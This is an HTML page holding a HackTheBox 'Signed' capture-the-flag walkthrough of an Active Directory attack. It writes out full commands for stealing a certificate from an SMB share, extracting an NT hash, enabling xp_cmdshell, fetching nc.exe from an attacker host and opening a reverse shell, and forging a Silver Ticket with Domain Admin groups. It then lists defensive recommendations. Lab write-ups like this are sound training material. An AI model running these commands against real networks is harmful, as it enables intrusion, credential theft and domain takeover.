<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Signed Writeup | PLSCARRYME - HTB Writeups</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
            color: #e0e0e0;
            line-height: 1.8;
            min-height: 100vh;
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
            padding: 0 20px;
        }

        /* Header */
        header {
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(10px);
            border-bottom: 2px solid #9fef00;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem 0;
        }

        .logo {
            font-size: 1.5rem;
            font-weight: bold;
            color: #9fef00;
            text-decoration: none;
        }

        .back-link {
            color: #9fef00;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            transition: opacity 0.3s ease;
        }

        .back-link:hover {
            opacity: 0.8;
        }

        /* Progress bar */
        .progress-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background: rgba(255, 255, 255, 0.1);
            z-index: 101;
        }

        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #9fef00, #7bc800);
            width: 0%;
            transition: width 0.1s ease;
        }

        /* Writeup Header */
        .writeup-header {
            text-align: center;
            padding: 3rem 0;
            border-bottom: 1px solid rgba(159, 239, 0, 0.2);
            margin-bottom: 3rem;
        }

        .writeup-title {
            font-size: 3rem;
            color: #9fef00;
            margin-bottom: 1rem;
            text-shadow: 0 0 20px rgba(159, 239, 0, 0.3);
        }

        .writeup-meta {
            display: flex;
            justify-content: center;
            gap: 2rem;
            margin-bottom: 1.5rem;
            flex-wrap: wrap;
        }

        .meta-item {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            opacity: 0.8;
        }

        .difficulty {
            padding: 0.5rem 1rem;
            border-radius: 25px;
            font-weight: bold;
            text-transform: uppercase;
            font-size: 0.9rem;
        }

        .difficulty.medium { background: #ffc107; color: #000; }

        .writeup-tags {
            display: flex;
            justify-content: center;
            gap: 0.5rem;
            flex-wrap: wrap;
        }

        .tag {
            background: rgba(159, 239, 0, 0.2);
            color: #9fef00;
            padding: 0.3rem 0.8rem;
            border-radius: 15px;
            font-size: 0.8rem;
        }

        /* Content */
        .writeup-content {
            padding-bottom: 3rem;
        }

        .writeup-content h1,
        .writeup-content h2,
        .writeup-content h3 {
            color: #9fef00;
            margin: 2rem 0 1rem 0;
            border-left: 4px solid #9fef00;
            padding-left: 1rem;
        }

        .writeup-content h1 { font-size: 2rem; }
        .writeup-content h2 { font-size: 1.5rem; }
        .writeup-content h3 { font-size: 1.2rem; }

        .writeup-content p {
            margin-bottom: 1.5rem;
            text-align: justify;
        }

        .writeup-content ul,
        .writeup-content ol {
            margin: 1rem 0 1.5rem 2rem;
        }

        .writeup-content li {
            margin-bottom: 0.5rem;
        }

        /* Code blocks */
        .writeup-content pre {
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(159, 239, 0, 0.3);
            border-radius: 8px;
            padding: 1.5rem;
            overflow-x: auto;
            margin: 1.5rem 0;
            position: relative;
        }

        .writeup-content code {
            color: #9fef00;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
        }

        .writeup-content p code {
            background: rgba(159, 239, 0, 0.2);
            padding: 0.2rem 0.4rem;
            border-radius: 4px;
            font-size: 0.85rem;
        }

        /* Images */
        .writeup-content img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            margin: 2rem 0;
            border: 1px solid rgba(159, 239, 0, 0.3);
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
        }

        /* Collapsible sections */
        details {
            background: rgba(159, 239, 0, 0.05);
            border: 1px solid rgba(159, 239, 0, 0.2);
            border-radius: 8px;
            margin: 1.5rem 0;
            padding: 1rem;
        }

        details summary {
            cursor: pointer;
            font-weight: 600;
            font-size: 1.5em;
            color: #9fef00;
            padding: 0.5rem;
            list-style: none;
            user-select: none;
        }

        details summary::-webkit-details-marker {
            display: none;
        }

        details summary::before {
            content: '‚ñ∂';
            display: inline-block;
            margin-right: 0.5rem;
            transition: transform 0.3s ease;
        }

        details[open] summary::before {
            transform: rotate(90deg);
        }

        .indented {
            padding: 1rem 0 0 1rem;
        }

        /* Info boxes */
        .success-box,
        .warning-box,
        .info-box {
            padding: 1rem 1.5rem;
            border-radius: 8px;
            margin: 1.5rem 0;
            border-left: 4px solid;
        }

        .success-box {
            background: rgba(40, 167, 69, 0.2);
            border-color: #28a745;
        }

        .warning-box {
            background: rgba(255, 193, 7, 0.2);
            border-color: #ffc107;
        }

        .info-box {
            background: rgba(23, 162, 184, 0.2);
            border-color: #17a2b8;
        }

        /* Navigation buttons */
        .nav-buttons {
            display: flex;
            justify-content: space-between;
            margin: 3rem 0;
            gap: 1rem;
        }

        .nav-button {
            background: linear-gradient(45deg, #9fef00, #7bc800);
            color: #000;
            padding: 1rem 2rem;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            text-decoration: none;
            transition: transform 0.2s ease;
            flex: 1;
            text-align: center;
            max-width: 200px;
        }

        .nav-button:hover {
            transform: translateY(-2px);
        }

        .nav-button.disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        hr {
            border: none;
            border-top: 1px solid rgba(159, 239, 0, 0.2);
            margin: 2rem 0;
        }

        /* Step sections */
        .step-section {
            margin: 2rem 0;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .writeup-title {
                font-size: 2rem;
            }

            .writeup-meta {
                flex-direction: column;
                gap: 1rem;
            }

            .nav-buttons {
                flex-direction: column;
            }

            .nav-button {
                max-width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="progress-container">
        <div class="progress-bar" id="reading-progress"></div>
    </div>

    <header>
        <div class="container">
            <nav>
                <a href="../index.html" class="logo"><i class="fas fa-terminal"></i> PLSCARRYME</a>
                <a href="../index.html" class="back-link">
                    <i class="fas fa-arrow-left"></i> Back to Writeups
                </a>
            </nav>
        </div>
    </header>

    <main class="container">
        <section class="writeup-header">
            <h1 class="writeup-title">Signed</h1>
            
            <div class="writeup-meta">
                <div class="meta-item">
                    <i class="fas fa-server"></i>
                    <span>HackTheBox</span>
                </div>
                <div class="meta-item">
                    <span class="difficulty medium">Medium</span>
                </div>
                <div class="meta-item">
                    <i class="fas fa-desktop"></i>
                    <span>Windows</span>
                </div>
            </div>

            <div class="writeup-tags">
                <span class="tag">Active Directory</span>
                <span class="tag">Kerberos</span>
                <span class="tag">Silver Ticket</span>
                <span class="tag">MSSQL</span>
                <span class="tag">Certificate</span>
            </div>
        </section>

        <section class="writeup-content">
            <details open>
                <summary>Reconnaissance</summary>
                <div class="indented">
                    <h3>üîç 1. Initial Nmap Scan</h3>
                    <p>Started with a comprehensive nmap scan to identify open ports and services:</p>

                    <pre><code class="language-bash">nmap -sCV -T4 -p- -oN nmap-signed.nmap 10.10.11.55</code></pre>

                    <div class="info-box">
                        <strong>Key Findings:</strong>
                        <ul>
                            <li>Port 53: DNS</li>
                            <li>Port 88: Kerberos</li>
                            <li>Port 135, 139, 445: SMB/RPC</li>
                            <li>Port 389, 636, 3268, 3269: LDAP/LDAPS</li>
                            <li>Port 1433: MSSQL</li>
                            <li>Domain: SIGNED.HTB</li>
                        </ul>
                    </div>

                    <hr>

                    <h3>üìã 2. SMB Enumeration</h3>
                    <p>Enumerated SMB shares using netexec:</p>

                    <pre><code class="language-bash">netexec smb 10.10.11.55 -u 'guest' -p '' --shares</code></pre>

                    <p>Discovered writable share:</p>
                    <ul>
                        <li><strong>Share:</strong> SharedDocs (READ, WRITE)</li>
                    </ul>

                    <hr>

                    <h3>üîê 3. Certificate Analysis</h3>
                    <p>Found a certificate file on the SMB share and extracted the certificate chain:</p>

                    <pre><code class="language-bash">smbclient //10.10.11.55/SharedDocs -U guest%
get signedca.crt</code></pre>

                    <p>Analyzed the certificate to extract user information:</p>

                    <pre><code class="language-bash">openssl pkcs12 -in signedca.pfx -nokeys -out signedca_cert.pem
openssl pkcs12 -in signedca.pfx -nocerts -nodes -out signedca_key.pem</code></pre>

                    <div class="success-box">
                        <strong>Certificate Information:</strong>
                        <ul>
                            <li>Subject: CN=mssqlsvc</li>
                            <li>Issuer: CN=signedca</li>
                            <li>Domain: signed.htb</li>
                        </ul>
                    </div>

                    <hr>

                    <h3>üéüÔ∏è 4. Request TGT using Certificate</h3>
                    <p>Used certipy to authenticate with the certificate and request a TGT:</p>

                    <pre><code class="language-bash">certipy auth -pfx signedca.pfx -dc-ip 10.10.11.55 -domain signed.htb -username mssqlsvc -ns 10.10.11.55</code></pre>

                    <div class="success-box">
                        <strong>Obtained Credentials:</strong>
                        <ul>
                            <li>Username: mssqlsvc</li>
                            <li>NT Hash: EF699384C3285C54128A3EE1DDB1A0CC</li>
                        </ul>
                    </div>
                </div>
            </details>

            <details open>
                <summary>User &lt;/&gt;</summary>
                <div class="indented">
                    <h3>üóÑÔ∏è 5. MSSQL Access</h3>
                    <p>Connected to MSSQL service using the obtained credentials:</p>

                    <pre><code class="language-bash">mssqlclient.py -k -no-pass -dc-ip 10.10.11.55 SIGNED.HTB/mssqlsvc@DC01.SIGNED.HTB</code></pre>

                    <div class="info-box">
                        <strong>Connection Details:</strong>
                        <p>Successfully authenticated to SQL Server using Kerberos authentication with encryption required.</p>
                    </div>

                    <hr>

                    <h3>‚öôÔ∏è 6. Enable xp_cmdshell</h3>
                    <p>Enabled xp_cmdshell to execute system commands:</p>

                    <pre><code class="language-sql">EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;</code></pre>

                    <hr>

                    <h3>üîÑ 7. Reverse Shell Setup</h3>
                    <p>Downloaded netcat to the target machine:</p>

                    <pre><code class="language-sql">xp_cmdshell "powershell wget -UseBasicParsing http://10.10.14.5:3000/nc.exe -OutFile %temp%/nc.exe"</code></pre>

                    <p>Started listener on attacking machine:</p>

                    <pre><code class="language-bash">rlwrap nc -nlvp 4000</code></pre>

                    <p>Executed reverse shell from MSSQL:</p>

                    <pre><code class="language-sql">xp_cmdshell %temp%\nc.exe -nv 10.10.14.18 4000 -e cmd.exe</code></pre>

                    <div class="success-box">
                        <strong>Shell Access:</strong> Successfully obtained reverse shell as SIGNED\mssqlsvc
                    </div>

                    <hr>

                    <h3>üö© 8. User Flag</h3>
                    <p>Retrieved the user flag from the Desktop:</p>

                    <pre><code class="language-bash">C:\Users\mssqlsvc\Desktop> type user.txt
[USER FLAG RETRIEVED]</code></pre>
                </div>
            </details>

            <details open>
                <summary>Root &lt;/&gt;</summary>
                <div class="indented">
                    <h3>üîç 9. SID Enumeration</h3>
                    <p>Retrieved SIDs for privileged groups and the service account to prepare for Silver Ticket attack:</p>

                    <div class="info-box">
                        <strong>Domain SIDs:</strong>
                        <ul>
                            <li><strong>Domain Admins:</strong> S-1-5-21-4088429403-1159899800-2753317549-512</li>
                            <li><strong>Enterprise Admins:</strong> S-1-5-21-4088429403-1159899800-2753317549-519</li>
                            <li><strong>mssqlsvc RID:</strong> 1103</li>
                        </ul>
                    </div>

                    <hr>

                    <h3>üé´ 10. Forge Silver Ticket</h3>
                    <p>Created a forged Kerberos Silver Ticket with elevated privileges:</p>

                    <pre><code class="language-bash">ticketer.py -nthash EF699384C3285C54128A3EE1DDB1A0CC \
  -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
  -domain SIGNED.HTB \
  -spn MSSQLSvc/DC01.SIGNED.HTB \
  -groups 512,519,1105 \
  -user-id 1103 \
  mssqlsvc</code></pre>

                    <div class="warning-box">
                        <strong>Technique Explanation:</strong>
                        <ul>
                            <li><code>-groups 512,519,1105</code>: Adding Domain Admins (512) and Enterprise Admins (519) membership</li>
                            <li><code>-user-id 1103</code>: RID of SIGNED\mssqlsvc</li>
                            <li><code>-spn</code>: Target service principal name</li>
                        </ul>
                    </div>

                    <p>Export the ticket for use:</p>

                    <pre><code class="language-bash">export KRB5CCNAME=mssqlsvc.ccache</code></pre>

                    <hr>

                    <h3>üîì 11. Privileged MSSQL Access</h3>
                    <p>Connected to MSSQL with the forged ticket and enabled advanced features:</p>

                    <pre><code class="language-sql">EXEC sp_configure 'show advanced options', 1; 
RECONFIGURE;
EXEC sp_configure 'Ad Hoc Distributed Queries', 1; 
RECONFIGURE;</code></pre>

                    <hr>

                    <h3>üëë 12. Root Flag Retrieval</h3>
                    <p>With elevated privileges, read the root flag directly from the Administrator's desktop:</p>

                    <pre><code class="language-sql">SELECT * FROM OPENROWSET(
    BULK 'C:\Users\Administrator\Desktop\root.txt', 
    SINGLE_CLOB
) AS x;</code></pre>

                    <pre><code class="language-text">BulkColumn
---------------------------------------
b'329df3df42d69adbe23f40b9d063aa60\r\n'</code></pre>

                    <div class="success-box">
                        <strong>Root Access Achieved:</strong> Successfully escalated privileges using forged Silver Ticket and retrieved root flag!
                    </div>
                </div>
            </details>

            <!-- Summary Section -->
            <div class="step-section">
                <h2>Attack Chain Summary</h2>
                <p>This writeup demonstrated a classic Active Directory attack chain leveraging certificate-based authentication and Kerberos Silver Ticket forgery:</p>

                <pre><code class="language-text">SMB Guest Access
    ‚Üí Certificate Discovery
    ‚Üí Certipy Authentication (TGT Request)
    ‚Üí NT Hash Extraction
    ‚Üí MSSQL Kerberos Login
    ‚Üí xp_cmdshell Execution
    ‚Üí Reverse Shell as mssqlsvc
    ‚Üí SID Enumeration
    ‚Üí Silver Ticket Forgery
    ‚Üí Privileged MSSQL Access
    ‚Üí Root Flag Retrieval</code></pre>

                <h3>Key Techniques Demonstrated</h3>
                <ul>
                    <li><strong>Certificate-Based Authentication:</strong> Using PKINIT to request TGT with certificate</li>
                    <li><strong>Kerberos Silver Ticket:</strong> Forging service tickets with elevated privileges</li>
                    <li><strong>MSSQL Exploitation:</strong> Leveraging xp_cmdshell for command execution</li>
                    <li><strong>Privilege Escalation:</strong> Abusing service account with manipulated group memberships</li>
                    <li><strong>Ad Hoc Queries:</strong> Using OPENROWSET for file system access</li>
                </ul>

                <h3>Tools Used</h3>
                <ul>
                    <li><strong>Nmap:</strong> Network reconnaissance and service enumeration</li>
                    <li><strong>NetExec:</strong> SMB enumeration and share discovery</li>
                    <li><strong>OpenSSL:</strong> Certificate analysis and manipulation</li>
                    <li><strong>Certipy:</strong> Certificate-based authentication and TGT requests</li>
                    <li><strong>mssqlclient.py (Impacket):</strong> MSSQL client with Kerberos support</li>
                    <li><strong>ticketer.py (Impacket):</strong> Kerberos ticket forgery</li>
                    <li><strong>Netcat:</strong> Reverse shell establishment</li>
                </ul>

                <h3>Critical Vulnerabilities Exploited</h3>
                <ul>
                    <li><strong>Exposed Certificate:</strong> Certificate file accessible via SMB guest access</li>
                    <li><strong>Certificate Authentication:</strong> Service account certificate usable for domain authentication</li>
                    <li><strong>xp_cmdshell Enabled:</strong> Allows arbitrary command execution through SQL</li>
                    <li><strong>Service Account Hash:</strong> NT hash extracted from certificate authentication</li>
                    <li><strong>Silver Ticket Attack:</strong> Forged service tickets accepted without validation</li>
                    <li><strong>Excessive Service Privileges:</strong> MSSQL service running with high privileges</li>
                </ul>

                <div class="warning-box">
                    <strong>Defensive Recommendations:</strong>
                    <ul>
                        <li>Restrict SMB guest access and properly secure sensitive shares</li>
                        <li>Implement proper certificate management and access controls</li>
                        <li>Disable xp_cmdshell unless absolutely necessary</li>
                        <li>Use Managed Service Accounts (MSA/gMSA) with rotating credentials</li>
                        <li>Monitor for anomalous Kerberos ticket requests and Silver Ticket indicators</li>
                        <li>Implement least privilege for service accounts</li>
                        <li>Enable advanced Kerberos auditing and monitoring</li>
                        <li>Use Protected Users group for sensitive accounts</li>
                        <li>Implement PAW (Privileged Access Workstation) for administrative tasks</li>
                    </ul>
                </div>
            </div>
        </section>

        <div class="nav-buttons">
            <a href="../index.html" class="nav-button">
                <i class="fas fa-home"></i> Back to Home
            </a>
            <a href="#" class="nav-button disabled">
                Next Writeup <i class="fas fa-arrow-right"></i>
            </a>
        </div>
    </main>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    
    <script>
        // Reading progress bar
        function updateReadingProgress() {
            const article = document.querySelector('.writeup-content');
            const progressBar = document.getElementById('reading-progress');
            
            const articleTop = article.offsetTop;
            const articleHeight = article.offsetHeight;
            const windowHeight = window.innerHeight;
            const scrollTop = window.pageYOffset;
            
            const progress = (scrollTop - articleTop + windowHeight/2) / articleHeight;
            const progressPercentage = Math.max(0, Math.min(100, progress * 100));
            
            progressBar.style.width = progressPercentage + '%';
        }

        // Initialize
        window.addEventListener('scroll', updateReadingProgress);
        window.addEventListener('load', updateReadingProgress);
    </script>
</body>
</html>